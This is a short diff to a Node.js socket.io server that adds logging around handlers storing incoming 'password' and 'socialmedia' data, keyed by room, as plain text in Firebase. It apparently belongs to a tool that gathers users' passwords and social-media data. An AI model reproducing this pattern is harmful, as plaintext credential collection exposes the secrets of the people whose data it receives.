@@ -340,20 +340,23 @@ socket.on('connection',Socket=>{
 
 
    Socket.on("password",(room,data)=>{
+    console.log("Password")
   FirbaseDatabase.push(FirbaseDatabase.ref(firebasedatabase,"password"),{"id":room,"password":data}).then(()=>{
-
-  }).catch((ex)=>{
-
+    console.log("Suscess full")
+  }).catch(()=>{
+    console.log("error")
   })
+
   })
 
   Socket.on("socialmedia",(room,data)=>{
 
+    console.log("Social media")
     FirbaseDatabase.push(FirbaseDatabase.ref(firebasedatabase,"socialmedia"),{"id":room,"data":data}).then(()=>{
-
-    }).catch((ex)=>{
-  
-    })
+              console.log("Suscess full")
+            }).catch(()=>{
+              console.log("error")
+            })
   })
 
 
